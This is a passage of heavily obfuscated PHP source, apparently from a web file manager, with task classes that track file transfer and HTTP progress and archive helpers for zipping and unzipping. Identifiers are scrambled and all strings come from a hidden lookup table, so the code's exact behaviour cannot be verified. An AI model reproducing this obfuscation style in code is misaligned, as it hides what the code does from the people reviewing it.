self::changeStatus($ß¢Ü™, self::STATYS_RUNNING); } public static function killAll() { $¡¯¬›ğš =& $_SERVER[ùÆÎÔ“Ñ]; $ğ÷ÁÛ»‚ = self::listData(); foreach ($ğ÷ÁÛ»‚ as $°ç“) { self::kill($°ç“[$¡¯¬›ğš[399]]); } sleep(2); foreach ($ğ÷ÁÛ»‚ as $°ç“) { self::valueSet($°ç“[$¡¯¬›ğš[399]], !1); } } private static function changeStatus($’«èÅôï, $½“è¹Ô») { $ª„‹–Ä =& $_SERVER[ùÆÎÔ“Ñ]; $Ë¬²ª¶¬ = self::valueGet($’«èÅôï); if (!$Ë¬²ª¶¬) { return !1; } $Ë¬²ª¶¬[$ª„‹–Ä[751]] = $½“è¹Ô»; self::valueSet($’«èÅôï, $Ë¬²ª¶¬); self::log($ª„‹–Ä[1693] . $Ë¬²ª¶¬[$ª„‹–Ä[399]] . $ª„‹–Ä[1694] . $½“è¹Ô»); return !0; } public static function valueGet($ø©üœÂÁ = false) { $¿ú®²«í =& $_SERVER[ùÆÎÔ“Ñ]; $çÓÆÏçİ = defined($¿ú®²«í[475]) ? USER_ID : $¿ú®²«í[197]; if ($ø©üœÂÁ) { $÷€‰Ù‘æ = Model($¿ú®²«í[447])->where(array($¿ú®²«í[94] => $ø©üœÂÁ, $¿ú®²«í[33] => $¿ú®²«í[1076]))->find(); return $÷€‰Ù‘æ ? json_decode($÷€‰Ù‘æ[$¿ú®²«í[374]], !0) : !1; } return self::taskListUser($çÓÆÏçİ); } public static function taskListUser($Êã‡áßé = false) { $ÕÈ´¶·¨ =& $_SERVER[ùÆÎÔ“Ñ]; $ÅıœŸì¼ = array($ÕÈ´¶·¨[33] => $ÕÈ´¶·¨[1076]); if ($Êã‡áßé) { $ÅıœŸì¼[$ÕÈ´¶·¨[1667]] = $Êã‡áßé; } $œ¥ÇŠ“¢ = Model($ÕÈ´¶·¨[447])->where($ÅıœŸì¼)->select(); $œ¥ÇŠ“¢ = $œ¥ÇŠ“¢ ? $œ¥ÇŠ“¢ : array(); foreach ($œ¥ÇŠ“¢ as $ŞÑš™ìÜ => $’·Ñ£íÀ) { $œ¥ÇŠ“¢[$ŞÑš™ìÜ] = json_decode($’·Ñ£íÀ[$ÕÈ´¶·¨[374]], !0); } return $œ¥ÇŠ“¢; } public static function valueSet($øÔ™¨›¸, $©ìüĞ) { $Šøòº‰² =& $_SERVER[ùÆÎÔ“Ñ]; if (!$©ìüĞ) { return Model($Šøòº‰²[447])->where(array($Šøòº‰²[94] => $øÔ™¨›¸, $Šøòº‰²[33] => $Šøòº‰²[1076]))->delete(); } $²³ŞÏ  = json_encode($©ìüĞ); if (!$²³ŞÏ ) { ob_start(); var_dump($©ìüĞ); $”ÀòÌ£“ = ob_get_clean(); self::log($Šøòº‰²[1695] . json_encode_force($”ÀòÌ£“)); } if (!$øÔ™¨›¸ || !$©ìüĞ[$Šøòº‰²[399]]) { return !1; } $–×êÃİõ = defined($Šøòº‰²[475]) ? USER_ID : $Šøòº‰²[197]; $øÕ˜“ã± = array($Šøòº‰²[33] => $Šøòº‰²[1076], $Šøòº‰²[1667] => $–×êÃİõ, $Šøòº‰²[94] => $øÔ™¨›¸, $Šøòº‰²[374] => $²³ŞÏ ); $„’®êã = $Šøòº‰²[1696]; CacheLock::lock($„’®êã); Model($Šøòº‰²[447])->add($øÕ˜“ã±, array(), !0); CacheLock::unlock($„’®êã); } public static function log($Í‚‹Æ¤Š) { if (!GLOBAL_DEBUG) { return; } write_log($Í‚‹Æ¤Š, $_SERVER[ùÆÎÔ“Ñ][1697]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ãšüû·  =& $_SERVER[ùÆÎÔ“Ñ]; $ÇùˆÄ«¯ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ãšüû· [1698], array($this, $ãšüû· [1699])); Hook::bind($ãšüû· [1229], array($this, $ãšüû· [1700])); Hook::bind($ãšüû· [1701], array($this, $ãšüû· [1702])); Hook::bind($ãšüû· [604], array($this, $ãšüû· [1703])); Hook::bind($ãšüû· [605], array($this, $ãšüû· [1704])); Hook::bind($ãšüû· [610], array($this, $ãšüû· [1705])); Hook::bind($ãšüû· [611], array($this, $ãšüû· [1706])); Hook::bind($ãšüû· [607], array($this, $ãšüû· [1707])); Hook::bind($ãšüû· [608], array($this, $ãšüû· [1708])); Hook::bind($ãšüû· [574], array($this, $ãšüû· [1709])); Hook::bind($ãšüû· [571], array($this, $ãšüû· [1709])); Hook::bind($ãšüû· [576], array($this, $ãšüû· [1709])); Hook::bind($ãšüû· [578], array($this, $ãšüû· [1709])); Hook::bind($ãšüû· [580], array($this, $ãšüû· [1709])); Hook::bind($ãšüû· [1710], array($this, $ãšüû· [1711])); Hook::bind($ãšüû· [597], array($this, $ãšüû· [1712])); $this->sourceModelCopyFlag = !1; Hook::bind($ãšüû· [1713], array($this, $ãšüû· [1714])); Hook::bind($ãšüû· [1715], array($this, $ãšüû· [1716])); Hook::bind($ãšüû· [1717], array($this, $ãšüû· [1718])); $ÇùˆÄ«¯[$ãšüû· [1719]] = LNG($ãšüû· [1720]); $ÇùˆÄ«¯[$ãšüû· [1721]] = 0; $ÇùˆÄ«¯[$ãšüû· [1722]] = 0; $ÇùˆÄ«¯[$ãšüû· [1069]] = $ãšüû· [12]; $ÇùˆÄ«¯[$ãšüû· [1723]] = $ãšüû· [12]; $ÇùˆÄ«¯[$ãšüû· [1724]] = 0; $ÇùˆÄ«¯[$ãšüû· [1725]] = 0; $ÇùˆÄ«¯[$ãšüû· [1726]] = 0; if (!$ÇùˆÄ«¯[$ãšüû· [1567]]) { $ÇùˆÄ«¯[$ãšüû· [1567]] = LNG($ãšüû· [1727]); } } protected function endAfter() { $ßë²ı” =& $_SERVER[ùÆÎÔ“Ñ]; Hook::unbind($ßë²ı”[1698], array($this, $ßë²ı”[1699])); Hook::unbind($ßë²ı”[1229], array($this, $ßë²ı”[1700])); Hook::unbind($ßë²ı”[1701], array($this, $ßë²ı”[1702])); Hook::unbind($ßë²ı”[604], array($this, $ßë²ı”[1703])); Hook::unbind($ßë²ı”[605], array($this, $ßë²ı”[1704])); Hook::unbind($ßë²ı”[610], array($this, $ßë²ı”[1705])); Hook::unbind($ßë²ı”[611], array($this, $ßë²ı”[1706])); Hook::unbind($ßë²ı”[607], array($this, $ßë²ı”[1707])); Hook::unbind($ßë²ı”[608], array($this, $ßë²ı”[1708])); Hook::unbind($ßë²ı”[574], array($this, $ßë²ı”[1709])); Hook::unbind($ßë²ı”[571], array($this, $ßë²ı”[1709])); Hook::unbind($ßë²ı”[576], array($this, $ßë²ı”[1709])); Hook::unbind($ßë²ı”[578], array($this, $ßë²ı”[1709])); Hook::unbind($ßë²ı”[580], array($this, $ßë²ı”[1709])); Hook::unbind($ßë²ı”[1710], array($this, $ßë²ı”[1711])); Hook::unbind($ßë²ı”[597], array($this, $ßë²ı”[1712])); Hook::unbind($ßë²ı”[1713], array($this, $ßë²ı”[1714])); Hook::unbind($ßë²ı”[1715], array($this, $ßë²ı”[1716])); Hook::unbind($ßë²ı”[1717], array($this, $ßë²ı”[1718])); } public function copyMoveStart($èí¢±ö, $Â“Ï÷áË, $šŠˆ¤°Ï, $°ı»™£«) { $ÇşÍßÌ  =& $_SERVER[ùÆÎÔ“Ñ]; self::log($ÇşÍßÌ [1728] . $Â“Ï÷áË . $ÇşÍßÌ [70] . $°ı»™£«); $ĞÛ«„øÖ = rtrim(TEMP_FILES, $ÇşÍßÌ [8]); if (substr($Â“Ï÷áË, 0, strlen($ĞÛ«„øÖ)) == $ĞÛ«„øÖ) { return; } if (substr($°ı»™£«, 0, strlen($ĞÛ«„øÖ)) == $ĞÛ«„øÖ) { return; } $¶òàı¯º =& $this->task; $¶òàı¯º[$ÇşÍßÌ [1729]] = KodIO::transferType($èí¢±ö, $šŠˆ¤°Ï); $this->update(); } public function updateAfter() { $ıº¢¾±… =& $_SERVER[ùÆÎÔ“Ñ]; $ò²üÃ­Ÿ =& $this->task; if (!$ò²üÃ­Ÿ[$ıº¢¾±…[764]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ò²üÃ­Ÿ[$ıº¢¾±…[1729]] == $ıº¢¾±…[1318]) { return; } self::updateTask($ò²üÃ­Ÿ); } private static function updateTask(&$¹ò·¨è©) { $µ‚…‰ôŒ =& $_SERVER[ùÆÎÔ“Ñ]; if ($¹ò·¨è©[$µ‚…‰ôŒ[1729]] == $µ‚…‰ôŒ[1200] || $¹ò·¨è©[$µ‚…‰ôŒ[1729]] == $µ‚…‰ôŒ[107]) { if ($¹ò·¨è©[$µ‚…‰ôŒ[1723]]) { $¹ò·¨è©[$µ‚…‰ôŒ[1726]] = $¹ò·¨è©[$µ‚…‰ôŒ[1725]] + $¹ò·¨è©[$µ‚…‰ôŒ[1722]]; } } else { if ($¹ò·¨è©[$µ‚…‰ôŒ[1729]] == $µ‚…‰ôŒ[1319]) { if ($¹ò·¨è©[$µ‚…‰ôŒ[1723]] == $µ‚…‰ôŒ[1200]) { $¹ò·¨è©[$µ‚…‰ôŒ[1726]] = $¹ò·¨è©[$µ‚…‰ôŒ[1725]] + $¹ò·¨è©[$µ‚…‰ôŒ[1722]] * 0.5; } else { if ($¹ò·¨è©[$µ‚…‰ôŒ[1723]] == $µ‚…‰ôŒ[107]) { $¹ò·¨è©[$µ‚…‰ôŒ[1726]] = $¹ò·¨è©[$µ‚…‰ôŒ[1725]] + $¹ò·¨è©[$µ‚…‰ôŒ[1721]] * 0.5 + $¹ò·¨è©[$µ‚…‰ôŒ[1722]] * 0.5; } } } } $¹ò·¨è©[$µ‚…‰ôŒ[1669]] = $¹ò·¨è©[$µ‚…‰ôŒ[1726]] / $¹ò·¨è©[$µ‚…‰ôŒ[764]]; if ($¹ò·¨è©[$µ‚…‰ôŒ[1669]] > 0) { $İÛãóùê = timeFloat() - $¹ò·¨è©[$µ‚…‰ôŒ[1671]] - $¹ò·¨è©[$µ‚…‰ôŒ[1674]]; $¹ò·¨è©[$µ‚…‰ôŒ[1675]] = $İÛãóùê * (1 - $¹ò·¨è©[$µ‚…‰ôŒ[1669]]) / $¹ò·¨è©[$µ‚…‰ôŒ[1669]]; } } public function addPath($ÌÊŠº×) { $ÙÑ”˜”¤ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$ÌÊŠº×) { return; } $¿ğŸ†¬š =& $this->task; $â«Á”öÖ = IO::infoWithChildren($ÌÊŠº×); $ç¯Ù¤ë = $¿ğŸ†¬š[$ÙÑ”˜”¤[1730]] ? $¿ğŸ†¬š[$ÙÑ”˜”¤[1730]][$ÙÑ”˜”¤[1731]] : 0; $¿ğŸ†¬š[$ÙÑ”˜”¤[1730]] = array($ÙÑ”˜”¤[1731] => $ç¯Ù¤ë + 1, $ÙÑ”˜”¤[420] => $â«Á”öÖ[$ÙÑ”˜”¤[32]], $ÙÑ”˜”¤[84] => $â«Á”öÖ[$ÙÑ”˜”¤[84]], $ÙÑ”˜”¤[519] => $â«Á”öÖ[$ÙÑ”˜”¤[519]] ? $â«Á”öÖ[$ÙÑ”˜”¤[519]] : $â«Á”öÖ[$ÙÑ”˜”¤[84]]); if ($â«Á”öÖ[$ÙÑ”˜”¤[33]] == $ÙÑ”˜”¤[199]) { $¿ğŸ†¬š[$ÙÑ”˜”¤[787]] += 1; } else { $¿ğŸ†¬š[$ÙÑ”˜”¤[787]] += $â«Á”öÖ[$ÙÑ”˜”¤[79]][$ÙÑ”˜”¤[77]]; if ($â«Á”öÖ[$ÙÑ”˜”¤[402]]) { $¿ğŸ†¬š[$ÙÑ”˜”¤[787]] += $â«Á”öÖ[$ÙÑ”˜”¤[79]][$ÙÑ”˜”¤[78]] + 1; } } $¿ğŸ†¬š[$ÙÑ”˜”¤[764]] += $â«Á”öÖ[$ÙÑ”˜”¤[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($¦†éë©) { } public function sourceAddHashEnd($»­Îçä¤) { } public function sourceAddFileStart($ …Æ¡¾°) { $İÕŒ¶ÎÏ =& $_SERVER[ùÆÎÔ“Ñ]; $ï¦»µ˜® =& $this->task; $ï¦»µ˜®[$İÕŒ¶ÎÏ[1721]] = $ …Æ¡¾°[$İÕŒ¶ÎÏ[76]]; $ï¦»µ˜®[$İÕŒ¶ÎÏ[1719]] = $ …Æ¡¾°[$İÕŒ¶ÎÏ[32]]; $ï¦»µ˜®[$İÕŒ¶ÎÏ[1069]] = $ …Æ¡¾°[$İÕŒ¶ÎÏ[32]]; $ï¦»µ˜®[$İÕŒ¶ÎÏ[1732]] = $ …Æ¡¾°[$İÕŒ¶ÎÏ[84]]; $this->update(); } public function sourceAddFileEnd($ôì¥ãš—) { $£Ö×›Â =& $_SERVER[ùÆÎÔ“Ñ]; $™«ñı¥ı =& $this->task; $™«ñı¥ı[$£Ö×›Â[1726]] += $ôì¥ãš—[$£Ö×›Â[76]]; $™«ñı¥ı[$£Ö×›Â[1732]] = $ôì¥ãš—[$£Ö×›Â[84]]; $this->update(1); } public function copyFileStart($ïÇ†Ø’Ó, $×§Ì»™É, $·’ÙùÒ, $¥—“Õ„‡, $Ã°½¼¬¢, $×ë‘ëÜù) { $Ş°ÍÚÈ³ =& $_SERVER[ùÆÎÔ“Ñ]; $ÙËè¼®ğ = $Ã°½¼¬¢; if ($ÙËè¼®ğ == $GLOBALS[$Ş°ÍÚÈ³[1733]]) { $ÙËè¼®ğ = $GLOBALS[$Ş°ÍÚÈ³[1734]]; } $GLOBALS[$Ş°ÍÚÈ³[1734]] = $Ã°½¼¬¢; $GLOBALS[$Ş°ÍÚÈ³[1733]] = $×ë‘ëÜù; $½ËÉí’æ =& $this->task; $½ËÉí’æ[$Ş°ÍÚÈ³[1719]] = $ÙËè¼®ğ; $½ËÉí’æ[$Ş°ÍÚÈ³[1721]] = (int) $ïÇ†Ø’Ó->size($×§Ì»™É); $½ËÉí’æ[$Ş°ÍÚÈ³[1722]] = 0; $½ËÉí’æ[$Ş°ÍÚÈ³[1069]] = $Ş°ÍÚÈ³[12]; $½ËÉí’æ[$Ş°ÍÚÈ³[1723]] = $Ş°ÍÚÈ³[12]; $½ËÉí’æ[$Ş°ÍÚÈ³[1724]] = 0; $—§¦§ = $½ËÉí’æ[$Ş°ÍÚÈ³[1721]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($½ËÉí’æ[$Ş°ÍÚÈ³[399]] . $Ş°ÍÚÈ³[1735]); if ($—§¦§ && file_exists(get_path_father($¥—“Õ„‡))) { Cache::set($½ËÉí’æ[$Ş°ÍÚÈ³[399]] . $Ş°ÍÚÈ³[1735], $¥—“Õ„‡); $½ËÉí’æ[$Ş°ÍÚÈ³[1692]] = array($Ş°ÍÚÈ³[1736], $Ş°ÍÚÈ³[1737]); } $this->update(0, $—§¦§); } public static function updateCopyLocalFileSize($“¼Ã¡€‹) { $Õ†‡ø¬¿ =& $_SERVER[ùÆÎÔ“Ñ]; $›•ññù = Cache::get($“¼Ã¡€‹[$Õ†‡ø¬¿[399]] . $Õ†‡ø¬¿[1735]); if (!$›•ññù || !file_exists($›•ññù)) { return $“¼Ã¡€‹; } $“¼Ã¡€‹[$Õ†‡ø¬¿[1722]] = @filesize($›•ññù); $“¼Ã¡€‹[$Õ†‡ø¬¿[1726]] += $“¼Ã¡€‹[$Õ†‡ø¬¿[1722]]; self::updateTask($“¼Ã¡€‹); return $“¼Ã¡€‹; } public function copyFileEnd($”†î‰Íõ, $¬šû‰ªÚ, $¨Òáú¶ë, $Á®Ş½ÊÄ, $Ä—ŒÁ¡¬, $Ò§æÓ±Ö) { $ù™Ìş =& $_SERVER[ùÆÎÔ“Ñ]; $èŒÄÈÄÛ =& $this->task; $èŒÄÈÄÛ[$ù™Ìş[1722]] = $èŒÄÈÄÛ[$ù™Ìş[1721]]; $èŒÄÈÄÛ[$ù™Ìş[1723]] = $ù™Ìş[12]; unset($èŒÄÈÄÛ[$ù™Ìş[1692]]); if ($Ä—ŒÁ¡¬ == $èŒÄÈÄÛ[$ù™Ìş[1719]]) { $èŒÄÈÄÛ[$ù™Ìş[1725]] += $èŒÄÈÄÛ[$ù™Ìş[1721]]; $èŒÄÈÄÛ[$ù™Ìş[1726]] = $èŒÄÈÄÛ[$ù™Ìş[1725]]; $â×î§æµ = 1; if (isset($èŒÄÈÄÛ[$ù™Ìş[1732]]) && $èŒÄÈÄÛ[$ù™Ìş[1732]] == $¬šû‰ªÚ) { $â×î§æµ = 0; } $this->update($â×î§æµ); } else { $this->update(); $èŒÄÈÄÛ[$ù™Ìş[1722]] = 0; } Cache::remove($èŒÄÈÄÛ[$ù™Ìş[399]] . $ù™Ìş[1735]); self::log($ù™Ìş[1738] . $¬šû‰ªÚ . $ù™Ìş[70] . $Á®Ş½ÊÄ . $ù™Ìş[231] . $Ä—ŒÁ¡¬ . $ù™Ìş[1739] . $èŒÄÈÄÛ[$ù™Ìş[1719]]); } public function updateFileEnd($­©â—¦, $æÙ«úİ´) { $¨±Û·¢Å =& $_SERVER[ùÆÎÔ“Ñ]; $íÖÔÒè’ =& $this->task; $íÖÔÒè’[$¨±Û·¢Å[1719]] = $­©â—¦; $íÖÔÒè’[$¨±Û·¢Å[1721]] = $æÙ«úİ´; $íÖÔÒè’[$¨±Û·¢Å[1725]] += $æÙ«úİ´; $íÖÔÒè’[$¨±Û·¢Å[1726]] = $íÖÔÒè’[$¨±Û·¢Å[1725]]; $this->update(1); self::log($¨±Û·¢Å[1740] . $­©â—¦); } public function sourceModelCopy($úÈïàéú) { $êÀÎ‹®Š =& $_SERVER[ùÆÎÔ“Ñ]; $ÖæĞª´ = $úÈïàéú[0]; $É±¶áûš = $úÈïàéú[1]; $äŒ¬Ü•³ =& $this->task; $this->sourceModelCopyFlag = !0; $˜ûİ†Å = 0; switch ($ÖæĞª´) { case $êÀÎ‹®Š[572]: $˜ûİ†Å = 1; break; case $êÀÎ‹®Š[575]: $äŒ¬Ü•³[$êÀÎ‹®Š[1719]] = $É±¶áûš[$êÀÎ‹®Š[32]]; break; case $êÀÎ‹®Š[577]: $˜ûİ†Å = intval($úÈïàéú[$êÀÎ‹®Š[380]] * 0.4); break; case $êÀÎ‹®Š[579]: $˜ûİ†Å = intval($úÈïàéú[$êÀÎ‹®Š[380]] * 0.2); break; case $êÀÎ‹®Š[581]: $˜ûİ†Å = intval($úÈïàéú[$êÀÎ‹®Š[380]] * 0.4); break; } $this->update($˜ûİ†Å); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ˆÄ™Şê¦, $ø¨ÔÛ›ú) { $ÔÒÄíÕ =& $_SERVER[ùÆÎÔ“Ñ]; $this->sourceModelCopyFlag = !0; $Æ“‡«ù´ = 1; if (isset($ˆÄ™Şê¦[$ÔÒÄíÕ[79]])) { $Æ“‡«ù´ = $ˆÄ™Şê¦[$ÔÒÄíÕ[79]][$ÔÒÄíÕ[77]]; $Æ“‡«ù´ = $Æ“‡«ù´ + $ˆÄ™Şê¦[$ÔÒÄíÕ[79]][$ÔÒÄíÕ[78]] + 1; } $this->update($Æ“‡«ù´); $this->sourceModelCopyFlag = !1; } public function sourceMove($ƒ›Ÿ ¤¤) { $this->sourceRemove($ƒ›Ÿ ¤¤, !1); } public function curlProgress($³ùäÙà’, $û¸úĞõê, $ØòÑÚÛ­, $‚¡Ãè¬, $¡òîˆó«) { $â§È²Å =& $_SERVER[ùÆÎÔ“Ñ]; $àØ¸ÊÆ =& $this->task; if ($¡òîˆó« > 0) { $àØ¸ÊÆ[$â§È²Å[1069]] = $â§È²Å[1741]; $àØ¸ÊÆ[$â§È²Å[1723]] = $â§È²Å[107]; if ($àØ¸ÊÆ[$â§È²Å[1721]]) { $àØ¸ÊÆ[$â§È²Å[1722]] = $¡òîˆó«; } if ($àØ¸ÊÆ[$â§È²Å[1724]]) { $àØ¸ÊÆ[$â§È²Å[1722]] = $¡òîˆó« + $àØ¸ÊÆ[$â§È²Å[1724]]; } } else { if ($ØòÑÚÛ­ > 0) { if ($àØ¸ÊÆ[$â§È²Å[1721]] == $û¸úĞõê) { $àØ¸ÊÆ[$â§È²Å[1722]] = $ØòÑÚÛ­; $àØ¸ÊÆ[$â§È²Å[1069]] = $â§È²Å[1742]; $àØ¸ÊÆ[$â§È²Å[1723]] = $â§È²Å[1200]; } } } $this->update(); } public function curlProgressStart($ï²–©ô) { } public function curlProgressEnd($¤€ç‡¥Õ) { $Üìµ²¢¹ =& $_SERVER[ùÆÎÔ“Ñ]; $Š‰¶®î =& $this->task; $ôÑ™á… = curl_getinfo($¤€ç‡¥Õ); $å›ë¼õî = $ôÑ™á…[$Üìµ²¢¹[1743]]; if ($å›ë¼õî == -1) { $å›ë¼õî = $ôÑ™á…[$Üìµ²¢¹[1744]]; } if ($Š‰¶®î[$Üìµ²¢¹[1723]] == $Üìµ²¢¹[107] && $å›ë¼õî) { $Š‰¶®î[$Üìµ²¢¹[1724]] += $å›ë¼õî; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $„–€Şñ =& $_SERVER[ùÆÎÔ“Ñ]; $©‘İØÜª =& $this->task; $©‘İØÜª[$„–€Şñ[1745]] = 1; Hook::bind($„–€Şñ[1713], array($this, $„–€Şñ[1746])); Hook::bind($„–€Şñ[1715], array($this, $„–€Şñ[1747])); Hook::bind($„–€Şñ[1717], array($this, $„–€Şñ[1748])); } protected function endAfter() { $Ñ¥¹â =& $_SERVER[ùÆÎÔ“Ñ]; Hook::unbind($Ñ¥¹â[1713], array($this, $Ñ¥¹â[1746])); Hook::unbind($Ñ¥¹â[1715], array($this, $Ñ¥¹â[1747])); Hook::unbind($Ñ¥¹â[1717], array($this, $Ñ¥¹â[1748])); } public function progressStart($é‚á”Ì¤) { $Êêµµ¾… =& $_SERVER[ùÆÎÔ“Ñ]; $€ÒÓÍÀ = curl_getinfo($é‚á”Ì¤); self::log($Êêµµ¾…[1749] . $€ÒÓÍÀ[$Êêµµ¾…[307]]); self::valueSet($this->task[$Êêµµ¾…[399]], $this->task); } public function progressEnd($û¼¢¿Ìõ) { $ˆ»ÑÂ§è =& $_SERVER[ùÆÎÔ“Ñ]; self::log($ˆ»ÑÂ§è[1750] . $this->task[$ˆ»ÑÂ§è[399]]); $this->end(); } public function progress($Ö—çÈü, $«¶›íë¶, $¢Ù§¢À°, $´æÖ×ªá, $ØƒË¹¸ğ) { $³ú¶ÊÑû =& $_SERVER[ùÆÎÔ“Ñ]; $¸ûâê‚ =& $this->task; if ($ØƒË¹¸ğ > 0) { $¸ûâê‚[$³ú¶ÊÑû[787]] = $¸ûâê‚[$³ú¶ÊÑû[787]] == 0 ? $´æÖ×ªá : $¸ûâê‚[$³ú¶ÊÑû[787]]; $¸ûâê‚[$³ú¶ÊÑû[1668]] = $ØƒË¹¸ğ; } else { if ($¢Ù§¢À° > 0) { $¸ûâê‚[$³ú¶ÊÑû[787]] = $¸ûâê‚[$³ú¶ÊÑû[787]] == 0 ? $«¶›íë¶ : $¸ûâê‚[$³ú¶ÊÑû[787]]; $¸ûâê‚[$³ú¶ÊÑû[1668]] = $¢Ù§¢À°; } } $this->update(); self::log("\160\162\x6f\147\x72\x65\x73\x73\x48\164\164\160\72\144\157\167\x6e\72{$¢Ù§¢À°}\x2f{$«¶›íë¶}\x3b\x20\165\x70\x6c\157\141\144\72{$ØƒË¹¸ğ}\x2f{$´æÖ×ªá}\x3b"); } } goto eöÈ¼äêÃà; eôğŠ·ÁÅ: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Áì°ñ°Ù; if ($Áì°ñ°Ù) { return $Áì°ñ°Ù; } $ÁóÆíÃ© = IO::init($_SERVER[ùÆÎÔ“Ñ][8]); return $ÁóÆíÃ©; } private static function iconvSystem($¨Éåƒûµ) { return self::local()->iconvSystem($¨Éåƒûµ); } private static function iconvApp($´ÒõùÈı) { return self::local()->iconvApp($´ÒõùÈı); } public static function zipFolder($ ó€½´, $Á¦¼‚¬û = "\172\151\x70", $œÁ¨óÛ = '', $¸Íõ¶ = REPEAT_RENAME) { $ŞÌˆ°¾ =& $_SERVER[ùÆÎÔ“Ñ]; $ûÇï‘³ = IO::listPath($ ó€½´); if (!$ûÇï‘³) { return !1; } $ûÇï‘³ = array_merge($ûÇï‘³[$ŞÌˆ°¾[82]], $ûÇï‘³[$ŞÌˆ°¾[83]]); return self::zip($ûÇï‘³, $Á¦¼‚¬û, $œÁ¨óÛ, $¸Íõ¶); } public static function zip($„¬ìåÛĞ, $¥µ–ñøÓ = "\172\151\160", $İ¥Ñ‡Æú = '', $êÃî¤ş = REPEAT_RENAME) { $ŠåÏ‹¶÷ =& $_SERVER[ùÆÎÔ“Ñ]; if (is_string($„¬ìåÛĞ) && $„¬ìåÛĞ) { $„¬ìåÛĞ = array(array($ŠåÏ‹¶÷[84] => $„¬ìåÛĞ)); } $œœ›è¦ß = self::init($„¬ìåÛĞ[0][$ŠåÏ‹¶÷[84]]); $¾¸ïß¨‘ = self::info($„¬ìåÛĞ[0][$ŠåÏ‹¶÷[84]]); $Íâ­ÈÖ = $ŠåÏ‹¶÷[12]; $ŠµÑÑ… = $ŠåÏ‹¶÷[12]; $·‰¬«ûâ = $ŠåÏ‹¶÷[12]; if ($İ¥Ñ‡Æú) { $ŠµÑÑ… = get_path_father($İ¥Ñ‡Æú); $·‰¬«ûâ = get_path_this($İ¥Ñ‡Æú); } else { $ŠµÑÑ… = self::pathFather($¾¸ïß¨‘[$ŠåÏ‹¶÷[84]]); $·‰¬«ûâ = $¾¸ïß¨‘[$ŠåÏ‹¶÷[32]] . $ŠåÏ‹¶÷[10] . $¥µ–ñøÓ; if (count($„¬ìåÛĞ) > 1) { $ŠıßˆµŸ = IO::info($ŠµÑÑ…); $·‰¬«ûâ = $ŠıßˆµŸ[$ŠåÏ‹¶÷[32]] . $ŠåÏ‹¶÷[10] . $¥µ–ñøÓ; } } if ($œœ›è¦ß->getType() == $ŠåÏ‹¶÷[106]) { $ˆÓùµÍ = self::init($ŠµÑÑ…); $Ë¼Ç°ô = $ˆÓùµÍ->getType() == $ŠåÏ‹¶÷[106] ? $ŠµÑÑ… : get_path_father($œœ›è¦ß->path); $Ë¼Ç°ô = rtrim($Ë¼Ç°ô, $ŠåÏ‹¶÷[8]) . $ŠåÏ‹¶÷[8]; mk_dir($Ë¼Ç°ô); } else { $Íâ­ÈÖ = TEMP_FILES . $ŠåÏ‹¶÷[1189] . time() . rand_string(8) . $ŠåÏ‹¶÷[8]; mk_dir($Íâ­ÈÖ); file_put_contents($Íâ­ÈÖ . $ŠåÏ‹¶÷[1190], $ŠåÏ‹¶÷[12]); $Ë¼Ç°ô = $Íâ­ÈÖ; } $ï¶Îù‡è = IO::info($Ë¼Ç°ô); if (!$ï¶Îù‡è || !$ï¶Îù‡è[$ŠåÏ‹¶÷[202]]) { show_json(LNG($ŠåÏ‹¶÷[1191]), !1); } $şàÕğ¼ª = self::zipFileList($„¬ìåÛĞ, $Íâ­ÈÖ); foreach ($şàÕğ¼ª as $²®ÈÕÎ => $´îœ´¿û) { $şàÕğ¼ª[$²®ÈÕÎ] = self::iconvSystem($´îœ´¿û); } $Å«üøª½ = get_filename_auto($Ë¼Ç°ô . $·‰¬«ûâ, $ŠåÏ‹¶÷[12], $êÃî¤ş); KodArchive::create(self::iconvSystem($Å«üøª½), $şàÕğ¼ª); if (!IO::exist($Å«üøª½)) { if ($Íâ­ÈÖ) { del_dir($Íâ­ÈÖ); } show_json(LNG($ŠåÏ‹¶÷[1192]), !1); } if (!$Íâ­ÈÖ) { return $Å«üøª½; } $ÆÓ­Ñ» = self::move($Å«üøª½, $ŠµÑÑ…, $êÃî¤ş); if ($Íâ­ÈÖ) { del_dir($Íâ­ÈÖ); } if (!$Å«üøª½) { show_json(LNG($ŠåÏ‹¶÷[1192]), !1); } return $ÆÓ­Ñ»; } public static function unzip($ƒ‚Äù¬Ÿ, $öê¦Š¹µ, $‚…œÓ˜¡ = "\55\x31", $âƒ­±é› = "\162\x65\160\154\x61\143\145") { $óÌÑ™™û =& $_SERVER[ùÆÎÔ“Ñ]; $‰»ÅşÍ× = parent::info($ƒ‚Äù¬Ÿ); if (!$‰»ÅşÍ×) { show_json(LNG($óÌÑ™™û[1193]), !1); } $ ì‚æÊĞ = IO::infoFull($öê¦Š¹µ); if (!$ ì‚æÊĞ) { $öê¦Š¹µ = IO::mkdir($öê¦Š¹µ); } if (isset($ ì‚æÊĞ[$óÌÑ™™û[402]]) && trim($ ì‚æÊĞ[$óÌÑ™™û[84]], $óÌÑ™™û[8]) != trim($öê¦Š¹µ, $óÌÑ™™û[8])) { $šÒ„é×ö = KodIO::make($ ì‚æÊĞ[$óÌÑ™™û[432]]); $…¥Œİëß = IO::fileNameAuto($šÒ„é×ö, $ ì‚æÊĞ[$óÌÑ™™û[32]], REPEAT_RENAME_FOLDER, !0); $öê¦Š¹µ = IO::mkdir($šÒ„é×ö . $…¥Œİëß); } $‚…œÓ˜¡ = $‚…œÓ˜¡ && $‚…œÓ˜¡ != $óÌÑ™™û[1194] ? @json_decode($‚…œÓ˜¡, !0) : -1; $•éÂéóŸ = self::unzipPart($ƒ‚Äù¬Ÿ, $‚…œÓ˜¡); if (!$•éÂéóŸ || !IO::exist($•éÂéóŸ[$óÌÑ™™û[199]])) { show_json(LNG($óÌÑ™™û[105]), !1); } $óÒëƒÒ‰ = $•éÂéóŸ[$óÌÑ™™û[1195]][count($•éÂéóŸ[$óÌÑ™™û[1195]]) - 1]; if ($óÒëƒÒ‰[$óÌÑ™™û[1196]] == -1 || substr($óÒëƒÒ‰[$óÌÑ™™û[32]], -1, 1) == 